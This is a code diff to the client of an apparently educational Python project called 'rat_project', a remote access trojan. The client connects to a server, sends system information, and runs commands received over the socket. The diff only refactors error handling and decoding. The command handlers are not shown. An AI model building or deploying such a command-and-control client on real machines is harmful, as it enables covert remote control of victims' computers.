@@ -1,7 +1,7 @@
 import platform
 import socket
 
-from rat_project.client.client_actions import get_system_info
+from rat_project.client.client_actions_os import get_system_info
 from rat_project.common.protocol import decode_message, encode_message
 from rat_project.utils.logger_config import setup_logger
 
@@ -38,29 +38,35 @@ def handle_server_command(message: dict[str, str]) -> dict[str, str]:
 
 
 def run_client() -> None:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
-        client_socket.connect((HOST, PORT))
-        logger.info("Connected to server %s:%s", HOST, PORT)
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+            client_socket.connect((HOST, PORT))
+            logger.info("Connected to server %s:%s", HOST, PORT)
 
-        payload = build_registration_payload()
-        client_socket.sendall(encode_message(payload))
-        logger.info("Registration sent: %s", payload)
+            payload = build_registration_payload()
+            client_socket.sendall(encode_message(payload))
+            logger.info("Registration sent: %s", payload)
 
-        data = client_socket.recv(4096)
-        message = decode_message(data)
-        logger.info("Received message: %s", message)
+            data = client_socket.recv(4096)
+            message = decode_message(data.decode("utf-8").strip())
+            logger.info("Received message: %s", message)
 
-        while True:
-            data = client_socket.recv(65536)
-            if not data:
-                logger.info("Server disconnected")
-                break
+            while True:
+                data = client_socket.recv(65536)
 
-            server_message = decode_message(data)
-            logger.info("Received command: %s", server_message)
+                if not data:
+                    logger.info("Server disconnected")
+                    break
 
-            response = handle_server_command(server_message)
-            client_socket.sendall(encode_message(response))
+                server_message = decode_message(data.decode("utf-8").strip())
+                logger.info("Received command: %s", server_message)
+
+                response = handle_server_command(server_message)
+                client_socket.sendall(encode_message(response))
+                logger.info("Response sent for command: %s", response.get("command"))
+
+    except Exception as exc:
+        logger.exception("Client error: %s", exc)
 
 
 if __name__ == "__main__":
